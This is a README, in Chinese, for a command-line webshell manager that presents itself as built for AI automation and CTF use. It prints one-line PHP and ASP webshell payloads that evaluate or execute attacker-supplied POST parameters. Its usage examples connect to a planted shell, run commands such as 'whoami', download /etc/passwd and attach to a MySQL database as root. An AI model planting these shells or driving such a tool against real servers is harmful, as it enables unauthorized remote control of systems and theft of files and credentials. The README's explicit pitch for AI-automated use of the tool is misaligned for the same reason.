# WebShell Manager

命令行WebShell管理工具，专为AI自动化和CTF设计。

## 特性

- **命令行优先** - 适合AI自动化操作
- **多类型支持** - PHP/JSP/ASP WebShell
- **完整功能** - 文件操作、数据库、系统信息
- **生产级代码** - 类型注解、异常处理、资源管理

## 安装

```bash
pip install -r requirements.txt
```

## 快速开始

### 交互模式

```bash
python run.py
```

### Python API

```python
from webshell import WebShellManager

manager = WebShellManager()
manager.connect('target', 'http://example.com/shell.php', 'password', 'php-eval')

shell = manager.get_shell('target')
success, result = shell.execute('whoami')
print(result)
```

## 支持的WebShell类型

### PHP
- `php-eval`: `<?php eval($_POST['pass']);?>`
- `php-assert`: `<?php assert($_POST['pass']);?>`
- `php-system`: `<?php system($_POST['pass']);?>`

### ASP
- `asp`: `<%execute(request("cmd"))%>`

### JSP
- `jsp`: 标准JSP一句话木马

## 使用示例

```python
# 连接
manager.connect('shell1', 'http://target.com/shell.php', 'pass', 'php-eval')

# 文件操作
from operations import FileOperations
file_ops = FileOperations(shell)
file_ops.download('/etc/passwd', 'local.txt')

# 数据库操作
from database import DatabaseManager
db_mgr = DatabaseManager(shell)
db_mgr.add_mysql('mydb', 'localhost', 3306, 'root', 'password')
```

## 配置

创建 `config.yaml`:

```yaml
timeout: 10
proxy: http://127.0.0.1:8080
log_level: INFO
```

## 项目结构

```
minna/
├── webshell.py      # WebShell核心模块
├── operations.py    # 文件和系统操作
├── database.py      # 数据库操作
├── config.py        # 配置管理
├── logger.py        # 日志系统
├── cli.py           # 命令行界面
├── main.py          # 主入口
└── run.py           # 启动脚本
```

## 许可证

MIT License
